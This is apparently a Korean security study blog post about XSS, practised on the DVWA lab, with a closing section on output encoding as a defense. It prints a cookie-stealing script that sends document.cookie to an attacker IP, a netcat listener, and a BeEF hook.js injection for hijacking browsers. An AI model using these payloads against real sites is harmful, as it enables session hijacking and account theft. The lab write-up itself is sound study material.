---
layout: post
title: "XSS (Cross-Site Scripting) 공부"
date: 2025-09-15 17:00:00 +0900
categories: [웹 해킹]
---

### 1. 개요

XSS(Cross-Site Scripting)는 공격자가 웹 애플리케이션에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 해당 스크립트가 실행되도록 만드는 공격이다. 이 공격은 [A03: Injection](https://hamap0.github.io/projects/owasp-top-10/2025/08/27/A03_Injection.html) 보고서에서 다룬 인젝션 공격의 한 종류이며 취약점 존재 증명이나 세션 쿠키 탈취 등 다양한 목적으로 사용될 수 있다.

---

### 2. 기본 유형 및 실습

#### **Reflected XSS (반사형)**
공격 스크립트가 URL 파라미터 등을 통해 서버로 전달된 후, 서버가 그 값을 응답 페이지에 그대로 포함하여 사용자에게 돌려줄 때 발생한다.

*   **DVWA 실습:**
    `XSS (Reflected)` 페이지에서 `name` 파라미터 값으로 `<script>alert('Reflected XSS')</script>`를 주입하면 서버 응답에 이 스크립트가 포함되어 경고창이 실행된다.

    [여기에 Reflected XSS 공격 성공 화면 스크린샷 삽입]

#### **Stored XSS (저장형)**
공격 스크립트가 게시판이나 방명록처럼 서버의 데이터베이스에 영구적으로 저장될 때 발생한다. 해당 페이지를 방문하는 모든 사용자가 공격의 영향을 받는다.

*   **DVWA 실습:**
    `XSS (Stored)` 페이지의 방명록에 `<script>alert('Stored XSS')</script>`를 포함한 메시지를 남기면 해당 스크립트가 데이터베이스에 저장된다. 이후 이 페이지를 방문하는 모든 사용자의 브라우저에서 경고창이 실행된다.

    [여기에 Stored XSS 공격 성공 화면 스크린샷 삽입]

---

### 3. 심화 활용: 쿠키 탈취

XSS 취약점은 사용자의 세션 쿠키를 탈취하여 계정을 도용하는 세션 하이재킹 공격에 사용될 수 있다.

#### **1. 공격자 리스너**
탈취한 쿠키를 수신하기 위해 공격자 PC에 서버가 필요하다. [보안 분석을 위한 리눅스 명령어 공부](https://hamap0.github.io/study/시스템-해킹/2025/09/14/보안-분석을-위한-리눅스-명령어-공부.html)에서 다룬 `netcat`을 이용해 특정 포트에서 연결을 대기하는 리스너를 실행할 수 있다.
```bash
# 80번 포트에서 연결을 대기하며 상세 정보를 출력
sudo nc -lvnp 80
```

#### **2. 쿠키 탈취 페이로드**
피해자의 브라우저에서 `document.cookie` 값을 읽어와 공격자 서버 `192.9.200.12`로 전송하는 스크립트이다.
```javascript
<script>
  document.location='http://192.9.200.12/?cookie=' + btoa(document.cookie);
</script>
```
*   `btoa()`: 쿠키 값에 포함될 수 있는 특수문자로 인해 URL이 깨지는 것을 방지하기 위해 Base64로 인코딩한다.

#### **3. 결과 확인**
이 페이로드를 Stored XSS 취약점이 있는 방명록에 삽입하면 해당 페이지를 방문하는 사용자의 브라우저는 스크립트를 실행한다. 그 결과 공격자의 `netcat` 리스너에는 피해자의 쿠키 값이 포함된 HTTP GET 요청이 수신된다.

[여기에 쿠키 값이 수신된 netcat 터미널 스크린샷 삽입]

### 4. 심화 활용 2: 브라우저 제어권 획득 (BeEF 연동)

XSS 공격의 파급력은 쿠키 탈취에 그치지 않는다. **BeEF(The Browser Exploitation Framework)**와 연동하면 피해자의 브라우저를 좀비처럼 제어하여 추가 공격을 수행할 수 있다.

#### **1. BeEF 실행 및 Hook URL 확인**
1.  공격자 PC에서 BeEF 프레임워크를 실행한다.
    ```bash
    sudo beef-xss
    ```
2.  BeEF의 관리자 페이지(UI)에 접속하여 로그인한다.
3.  관리자 페이지에 표시된 **Hook URL** (예: `<script src="http://192.9.200.12:3000/hook.js"></script>`)을 복사한다. 이 스크립트가 피해자의 브라우저를 제어하는 핵심 코드이다.

#### **2. Hook 스크립트 주입**
1.  복사한 Hook URL 스크립트 전체를 Stored XSS 취약점이 있는 DVWA 방명록에 삽입하고 게시글을 등록한다.

#### **3. 브라우저 Hooking 및 제어**
1.  피해자가 해당 방명록 페이지를 방문하면 브라우저는 자신도 모르게 **`hook.js`** 스크립트를 실행하고 공격자의 BeEF 서버에 연결된다.
2.  공격자는 BeEF 관리자 페이지의 `Online Browsers` 목록에서 연결된 피해자의 브라우저(Hooked Browser)를 확인할 수 있다.
3.  공격자는 `Commands` 탭의 다양한 모듈을 사용하여 피해자 브라우저를 대상으로 추가 공격을 수행할 수 있다.
    *   **Get Cookies**: 피해자의 쿠키 정보를 가져온다.
    *   **Redirect Browser**: 피해자의 브라우저를 특정 피싱 사이트로 강제 이동시킨다.
    *   **Create Alert Dialog**: 피해자의 화면에 임의의 경고창을 띄운다.

---

### 5. 방어 방안: 출력 인코딩

XSS 공격의 근본적인 원인은 사용자가 입력한 데이터를 서버가 그대로 HTML의 일부로 해석하여 출력하기 때문이다. 이를 막는 가장 효과적인 방법은 **출력 인코딩(Output Encoding)**이다.

사용자가 입력한 문자열에 포함된 `<`, `>` 같은 특수문자를 브라우저가 HTML 태그로 해석하지 못하도록 아래와 같이 안전한 문자(HTML Entities)로 변환하여 출력해야 한다.
*   `<` → `&lt;`
*   `>` → `&gt;`

이렇게 인코딩된 문자열은 브라우저 화면에는 원래의 꺾쇠 기호로 보이지만 HTML 파서는 이를 태그의 시작과 끝이 아닌 단순한 텍스트로만 인식하므로 스크립트가 실행되지 않는다.

<hr class="short-rule">
